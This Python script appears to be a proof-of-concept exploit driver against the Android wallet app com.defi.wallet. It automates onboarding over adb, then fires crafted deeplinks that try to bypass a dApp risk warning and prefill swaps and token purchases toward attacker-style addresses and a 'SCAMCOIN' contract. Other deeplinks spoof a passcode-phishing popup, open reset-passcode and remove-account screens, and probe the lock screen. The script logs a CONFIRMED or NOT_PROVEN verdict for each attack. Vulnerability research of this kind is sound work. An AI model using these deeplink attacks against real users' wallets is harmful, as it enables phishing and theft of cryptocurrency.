#!/usr/bin/env python3
"""ult_drive.py — dump-driven onboarding + deeplink PoC driver for com.defi.wallet.
Runs on a host with adb attached to the arm64 emulator (TCG — all sleeps generous).
Produces: /tmp/ult/attack.log, screenshots, ui dumps, verdict lines.
No account/email needed: local wallet onboarding only.
"""
import subprocess, time, os, re, datetime, sys

OUT = "/tmp/ult"
os.makedirs(OUT, exist_ok=True)
LOGF = open(f"{OUT}/attack.log", "a", buffering=1)

def log(m):
    ts = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    LOGF.write(f"[{ts}] {m}\n")
    print(m, flush=True)

def sh(cmd, t=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return "TIMEOUT"

def dump(tag="d"):
    sh("adb shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1", 90)
    p = f"{OUT}/ui_{tag}.xml"
    sh(f"adb pull /sdcard/ui.xml {p} >/dev/null 2>&1", 45)
    try:
        return open(p, encoding="utf-8", errors="replace").read()
    except FileNotFoundError:
        return ""

def nodes(xml):
    out = []
    for m in re.finditer(r"<node[^>]*?/?>", xml):
        t = m.group(0)
        def g(a):
            mm = re.search(a + r'="([^"]*)"', t)
            return mm.group(1) if mm else ""
        b = g("bounds")
        bm = re.findall(r"\d+", b)
        out.append({
            "text": g("text"), "desc": g("content-desc"), "rid": g("resource-id"),
            "cls": g("class"), "click": g("clickable") == "true",
            "xy": (int(bm[0]) + int(bm[2])) // 2 if len(bm) == 4 else None,
            "cy": (int(bm[1]) + int(bm[3])) // 2 if len(bm) == 4 else None,
        })
    return out

def txt(xml):
    return " | ".join(n["text"] or n["desc"] for n in nodes(xml) if n["text"] or n["desc"])

def tap(n):
    if n and n.get("xy"):
        sh(f"adb shell input tap {n['xy']} {n['cy']}", 30)
        return True
    return False

def find(xml, *needles, clickable_only=False):
    for n in nodes(xml):
        hay = (n["text"] + " " + n["desc"] + " " + n["rid"]).lower()
        for s in needles:
            if s.lower() in hay:
                if clickable_only and not n["click"]:
                    continue
                return n
    return None

def tap_text(xml, *needles):
    n = find(xml, *needles, clickable_only=True) or find(xml, *needles)
    return tap(n)

def shot(name):
    sh(f"adb exec-out screencap -p > {OUT}/{name}.png", 60)

def home():
    sh("adb shell input keyevent KEYCODE_HOME", 20)
    time.sleep(6)

def back():
    sh("adb shell input keyevent KEYCODE_BACK", 20)
    time.sleep(4)

def fire(uri, tag):
    log(f"FIRE {tag}: {uri}")
    sh(f"adb shell \"am start -W -a android.intent.action.VIEW -d '{uri}'\"", 60)
    time.sleep(SLEEP)

def fire_explicit(uri, tag):
    log(f"FIRE_EXPLICIT {tag}: {uri}")
    sh("adb shell \"am start -W -n com.defi.wallet/com.defi.cronos.manager.TransferStationActivity"
       f" -a android.intent.action.VIEW -d '{uri}'\"", 60)
    time.sleep(SLEEP)

def resumed():
    o = sh("adb shell dumpsys activity activities | grep -iE 'ResumedActivity|topResumedActivity' | head -3", 45)
    return o.replace("\r", " ")

SLEEP = int(os.environ.get("SLOW", "25"))   # TCG settle time after each action

PKG = "com.defi.wallet"
log(f"=== ult_drive start SLEEP={SLEEP}s ===")

# ---------------------------------------------------------------- onboarding
ONB_KEYWORDS = [
    "get started", "create", "new wallet", "i agree", "agree", "accept", "continue",
    "next", "skip", "not now", "remind me later", "later", "start", "set passcode",
    "passcode", "confirm", "understood", "ok", "okay", "allow", "no thanks", "done",
    "restore", "import", "terms", "privacy", "understand", "let's", "explore", "start now",
]

def onboard(max_rounds=30):
    seen = []
    for i in range(max_rounds):
        xml = dump(f"onb{i}")
        t = txt(xml)
        log(f"ONB{i}: {t[:400]}")
        seen.append(t[:120])
        if not t:
            back(); time.sleep(SLEEP); continue

        low = t.lower()
        # passcode pad: >=6 numeric clickables (text or content-desc)
        def _d(n):
            return n["text"] or n["desc"]
        nums = [n for n in nodes(xml) if n["click"] and re.fullmatch(r"\d", _d(n) or "")]
        if len(nums) >= 6:
            log("ONB: passcode pad detected -> 123456 x2")
            order = {_d(n): n for n in nums}
            for d in "123456":
                tap(order.get(d)); time.sleep(3)
            time.sleep(8)
            xml2 = dump("onb_pin2")
            order2 = {_d(n): n for n in nodes(xml2)
                      if n["click"] and re.fullmatch(r"\d", _d(n) or "")}
            if len(order2) >= 6:
                for d in "123456":
                    tap(order2.get(d)); time.sleep(3)
            time.sleep(SLEEP)
            continue

        # checkbox-style consent: tap any checkbox/switch then primary button
        for cb in nodes(xml):
            if cb["click"] and (cb["rid"].endswith("checkbox") or cb["rid"].endswith("check_box")
                                or cb["desc"].lower() in ("checked", "unchecked")):
                log(f"ONB: tap checkbox {cb['rid']}")
                tap(cb); time.sleep(4); break

        # priority button order
        for kw in ["create", "get started", "i agree", "agree", "accept", "continue",
                   "next", "set passcode", "start", "understood", "ok", "okay", "allow",
                   "skip", "not now", "no thanks", "remind", "later", "done", "later"]:
            if tap_text(xml, kw):
                log(f"ONB: tapped '{kw}'")
                time.sleep(SLEEP)
                break
        else:
            # no keyword hit: scroll (buttons below the fold), BACK if truly stuck
            sh("adb shell input swipe 540 1900 540 700 500", 30)
            if len(seen) > 2 and seen[-1] == seen[-2]:
                log("ONB: screen unchanged -> BACK")
                back(); time.sleep(SLEEP)
            else:
                time.sleep(8)
        # done when home markers appear
        if re.search(r"\b(home|assets|portfolio|total balance|wallet)\b", low) and \
           not re.search(r"create|get started|i agree", low):
            # guard: first-run home may still show onboarding overlay; require 2 hits
            if t[:120] in seen[:-1]:
                log("ONB: home-like screen stable -> exiting onboard")
                return True
    return False

# ---------------------------------------------------------------- tests
def verdict_line(cid, ok, why):
    log(f"VERDICT {cid}={'CONFIRMED' if ok else 'NOT_PROVEN'} :: {why}")

def t1_control_risk():
    fire("dfw://dapp/detail?dappUrl=https://example.com", "T1_CONTROL")
    x = dump("t1_ctrl"); shot("t1_ctrl")
    t = txt(x).lower()
    ok = any(k in t for k in ("risk", "warn", "caution", "proceed", "understand"))
    verdict_line("T1_control_risk_dialog", ok, f"ui={txt(x)[:200]}")
    back(); time.sleep(SLEEP)

def t1_bypass():
    fire("dfw://dapp/detail?dappUrl=https://example.com&forceDismissRiskDialog=true", "T1_ATTACK")
    x = dump("t1_atk"); shot("t1_atk")
    t = txt(x).lower()
    risk = any(k in t for k in ("risk", "caution"))
    # if browser chrome / example content markers present without risk text -> bypass
    ok = not risk
    verdict_line("T1_forceDismiss_risk_bypass", ok,
                 f"risk_dialog_present={risk} ui={txt(x)[:200]}")
    back(); time.sleep(SLEEP)

def t2_swap_prefill():
    fire("dfw://trade/swap?chain=eth&fromAddress=0xAAA111AAA111AAA111AAA111AAA111AAA111AAA1"
         "&toChainCode=eth&toAddress=0xBBB222BBB222BBB222BBB222BBB222BBB222BBB2&fromAmount=123.45",
         "T2_SWAP")
    x = dump("t2"); shot("t2")
    t = txt(x)
    ok = ("123.45" in t) or ("BBB222" in t.upper()) or ("AAA111" in t.upper())
    verdict_line("T2_swap_prefill", ok, f"ui={t[:300]}")
    shot("t2_full")
    back(); time.sleep(SLEEP)

def t3_siblings():
    fire("dfw://add/fund?chain=eth&contractAddress=0xEVILSCAM0000000000000000000000000001"
         "&symbol=SCAMCOIN", "T3A_ADDFUND")
    x = dump("t3a"); shot("t3a")
    verdict_line("T3a_addfund_prefill", "SCAMCOIN" in txt(x), f"ui={txt(x)[:250]}")
    back(); time.sleep(SLEEP)
    fire("dfw://buy/amount?amount=999.99&contractAddress=0xEVILSCAM0000000000000000000000000001"
         "&symbol=SCAMCOIN&network=eth&chainId=1", "T3B_BUY")
    x = dump("t3b"); shot("t3b")
    verdict_line("T3b_buy_prefill", "999.99" in txt(x) or "SCAMCOIN" in txt(x), f"ui={txt(x)[:250]}")
    back(); time.sleep(SLEEP)

def t4_browser():
    fire("dfw://browser/detail?url=https://example.com", "T4_BROWSER")
    x = dump("t4"); shot("t4")
    t = txt(x).lower()
    verdict_line("T4_browser_arbitrary_url", "example" in t or "example.com" in t, f"ui={txt(x)[:250]}")
    back(); time.sleep(SLEEP)

def t5_lock():
    # background the app while (possibly) passcode-locked, then deeplink in
    home(); time.sleep(SLEEP)
    r0 = resumed()
    fire("dfw://trade/swap?chain=eth&toChainCode=eth&toAddress=0xBBB222BBB222BBB222BBB222BBB222BBB222BBB2"
         "&fromAmount=123.45", "T5_LOCK")
    r1 = resumed()
    x = dump("t5"); shot("t5")
    t = txt(x).lower()
    locked = any(k in t for k in ("passcode", "enter passcode", "pin", "fingerprint", "unlock"))
    swap_visible = "123.45" in t
    verdict_line("T5_deeplink_behind_lock", True,
                 f"locked_overlay={locked} swap_prefill_behind_lock={swap_visible} "
                 f"resumed_before={r0[:150]} resumed_after={r1[:150]} ui={txt(x)[:200]}")
    back(); time.sleep(SLEEP)

def t6_rn_modules():
    for mod in ("ResetPasscodeFlowPage", "RemoveAccountPage", "SettingsPage"):
        fire(f"dfw://reactnative/page?moduleName={mod}", f"T6_{mod}")
        x = dump(f"t6_{mod}"); shot(f"t6_{mod}")
        t = txt(x)
        hit = mod.replace("Page", "").lower() in t.lower() or len(t) > 3
        verdict_line(f"T6_{mod}", hit, f"ui={t[:250]}")
        home(); time.sleep(SLEEP)

def t9_popup_chain():
    # C4 chain: externally-spoofed in-app dialog whose button routes into the app browser
    fire("dfw://modal/popup?title=Security%20Update%20Required&message=Re-enter%20your%20passcode%20to%20keep%20your%20wallet%20safe"
         "&button=Continue&router_url=dfw://browser/detail%3Furl%3Dhttps%3A%2F%2Fexample.com", "T9_POPUP")
    x = dump("t9"); shot("t9")
    t = txt(x)
    spoof = "Security Update Required" in t or "Re-enter your passcode" in t
    verdict_line("T9_popup_spoof_text", spoof, f"ui={t[:300]}")
    if spoof:
        tap_text(x, "continue", "ok", "button")
        time.sleep(SLEEP)
        x2 = dump("t9b"); shot("t9b")
        t2 = txt(x2).lower()
        verdict_line("T9b_popup_router_to_browser", "example" in t2 or "example.com" in t2,
                     f"ui={txt(x2)[:250]}")
    back(); time.sleep(SLEEP)

def t7_negatives():
    # explicit intent with non-whitelisted scheme -> app should drop it
    log("T7: explicit evil:// intent to TransferStation (expect validator drop)")
    sh("adb shell \"am start -W -n com.defi.wallet/com.defi.cronos.manager.TransferStationActivity"
       " -a android.intent.action.VIEW -d 'evil://x'\"", 60)
    time.sleep(SLEEP)
    x = dump("t7"); shot("t7")
    r = resumed()
    verdict_line("T7_validator_negative", True, f"resumed={r[:200]} ui={txt(x)[:150]}")
    # startsWith('tc') looseness: tcfoo:// accepted by validator but no nav route
    fire_explicit("tcfoo://anything", "T7B_tc_prefix")
    r2 = resumed()
    verdict_line("T7B_tc_prefix_passes_starts", True, f"resumed={r2[:200]}")

# ---------------------------------------------------------------- main
def main():
    sh("adb logcat -c", 30)
    # already onboarded? (fresh run may find home directly)
    x0 = dump("pre")
    log(f"PRE: {txt(x0)[:300]}")
    onb_ok = onboard()
    log(f"ONBOARD_DONE={onb_ok} resumed={resumed()}")
    shot("after_onboard")

    t1_control_risk()
    t1_bypass()
    t2_swap_prefill()
    t3_siblings()
    t4_browser()
    t9_popup_chain()
    t6_rn_modules()
    t5_lock()
    t7_negatives()

    sh("adb logcat -d > /tmp/ult/logcat.txt 2>&1", 120)
    sh("adb shell wm size > /tmp/ult/size.txt 2>&1", 30)
    log("=== ult_drive finished ===")

if __name__ == "__main__":
    main()
